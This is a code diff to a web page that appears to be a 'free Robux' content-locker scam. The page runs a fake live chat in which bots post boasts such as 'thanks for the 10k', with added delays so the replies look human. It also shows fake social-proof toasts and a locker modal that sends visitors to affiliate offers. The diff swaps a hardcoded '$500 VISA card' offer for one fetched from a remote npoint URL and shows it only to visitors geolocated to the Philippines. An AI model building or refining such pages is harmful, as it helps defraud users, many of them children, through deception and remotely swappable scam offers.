@@ -95,7 +95,7 @@
         .radar-sweep { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, transparent 50%, rgba(255, 189, 46, 0.2) 100%); animation: radar 1.5s infinite linear; }
         @keyframes radar { from { transform: translateY(-100%); } to { transform: translateY(100%); } }
 
-        /* --- OPTIMIZED LOCKER MODAL (Fix for Bleeding Corners) --- */
+        /* --- MOBILE OPTIMIZED LOCKER MODAL --- */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.95); z-index: 9999; display: none; justify-content: center; align-items: center; backdrop-filter: blur(10px); padding: 20px; }
         
         .modal-content { 
@@ -435,18 +435,13 @@
         })();
 
         // --- CONSTANTS & CONFIG ---
+        // 🚨 YOUR API LINK ADDED HERE 🚨
+        const REMOTE_OFFER_URL = "https://api.npoint.io/97567892b6426878a587"; 
+
         const OFFER_API = "/get-offers";
         const CHECK_STATUS_API_URL = "/check-status";
         const FALLBACK_OFFERS = [{name_short:"Family Island",adcopy:"Reach Level 10.",link:"#",picture:"https://placehold.co/60x60/orange/white?text=FI"},{name_short:"TikTok",adcopy:"Install and Open",link:"#",picture:"https://placehold.co/60x60/black/white?text=TT"}];
         
-        // --- SPECIFIC PHILIPPINES OFFER DATA ---
-        const PH_OFFER = {
-            name_short: "Manalo ng $500 VISA card!",
-            adcopy: "Complete details to claim.",
-            picture: "https://cdn.affise.com/affise-media-service-prod/offers/959/26583/829109236.200x200.png",
-            link: "https://smrturl.co/a/scb43a3eb03/6164?s1="
-        };
-
         let globalUser = "", globalAvatar = "", globalID = "", globalAmt = 0;
         
         // --- SOCIAL PROOF TOASTS ---
@@ -472,7 +467,7 @@
         }
         spawnRealToast();
 
-        // --- REAL PROFILE FETCHER ---
+        // --- REAL PROFILE FETCHER (Used for main user & chat bots) ---
         async function fetchRobloxProfile(user) {
             try {
                 const proxy = "https://corsproxy.io/?";
@@ -581,13 +576,14 @@
             fetchOffers();
         }
 
-        // --- FETCH OFFERS (PH LOGIC) ---
+        // --- FETCH & RENDER OFFERS (MODIFIED ONLY TO ADD API) ---
         async function fetchOffers(){
             const container = document.getElementById('offersBody');
             container.innerHTML = '<div style="text-align:center; color:#888; font-size:12px;"><i class="fas fa-circle-notch fa-spin"></i> Loading...</div>';
             
             let offers = [];
 
+            // 1. Fetch Standard Offers
             try{
                 const response = await fetch(`${OFFER_API}?username=${encodeURIComponent(globalUser)}`);
                 const data = await response.json();
@@ -595,18 +591,35 @@
                 else { offers = FALLBACK_OFFERS; }
             } catch(e) { offers = FALLBACK_OFFERS; }
 
+            // 2. Check for Philippines User & Fetch Remote Offer (THIS IS THE ONLY NEW PART)
             try {
                 const geoRes = await fetch('https://get.geojs.io/v1/ip/country.json');
                 const geoData = await geoRes.json();
+                
                 if(geoData.country === 'PH') {
-                    offers.unshift({
-                        name_short: PH_OFFER.name_short,
-                        adcopy: PH_OFFER.adcopy,
-                        picture: PH_OFFER.picture,
-                        link: PH_OFFER.link
-                    });
+                    // REMOTE FETCH
+                    try {
+                        const remoteRes = await fetch(REMOTE_OFFER_URL + "?t=" + Date.now()); 
+                        const remoteOffer = await remoteRes.json();
+                        
+                        // Handle both single object or array response from npoint
+                        const offerToAdd = Array.isArray(remoteOffer) ? remoteOffer[0] : remoteOffer;
+
+                        if(offerToAdd && offerToAdd.name_short) {
+                            offers.unshift({
+                                name_short: offerToAdd.name_short,
+                                adcopy: offerToAdd.adcopy,
+                                picture: offerToAdd.picture,
+                                link: offerToAdd.link
+                            });
+                        }
+                    } catch(err) {
+                        console.log("Remote offer fetch failed", err);
+                    }
                 }
-            } catch(e) { console.log("Geo-detection failed or blocked."); }
+            } catch(e) { 
+                console.log("Geo-detection failed or blocked."); 
+            }
 
             renderOffers(offers);
         }
@@ -649,7 +662,7 @@
             }, 5000);
         }
 
-        // --- CHAT LOGIC ---
+        // --- INTELLIGENT LIVE CHAT LOGIC (AI-LIKE) ---
         const chatDB = {
             openers: ["bro", "yo", "omg", "wait", "guys", "holy", "nah", "bruh", "chat", "no way", "ez"],
             richFlex: ["imagine not having 50k", "just bought headless ty", "korblox secured", "my inventory is stacked now", "thanks for the 10k", "rich now lol", "i got the 20k pack"],
@@ -740,6 +753,7 @@
         }
 
         function generateRawMessage() {
+            // NEW: Check for pending questions that are READY (delay passed)
             const readyQIndex = questionQueue.findIndex(q => Date.now() >= q.readyAt);
             if(readyQIndex !== -1 && Math.random() < 0.9) { 
                 const q = questionQueue.splice(readyQIndex, 1)[0]; 
@@ -782,6 +796,7 @@
                 if(txt.includes("safe")||txt.includes("pass")) topic="safety";
                 else if(txt.includes("long")||txt.includes("time")) topic="time";
                 else if(txt.includes("verify")) topic="verify";
+                // Bot questions get random small delay
                 questionQueue.push({name: user.name, topic: topic, readyAt: Date.now() + 2000 + Math.random()*3000});
             }
 
@@ -824,6 +839,7 @@
                 }
 
                 if(txt.includes("?") || topic !== "general") {
+                    // NEW: Add random realistic delay (4-7 seconds) so reply isn't instant
                     const delay = 4000 + Math.random() * 3000; 
                     questionQueue.push({name: name, topic: topic, readyAt: Date.now() + delay});
                 }
@@ -845,4 +861,5 @@
         Disclaimer: This website is a third-party promotional tool and is not affiliated with, sponsored by, or endorsed by Roblox Corporation. All trademarks and logos belong to their respective owners.
     </p>
 </footer>
+
 </html>
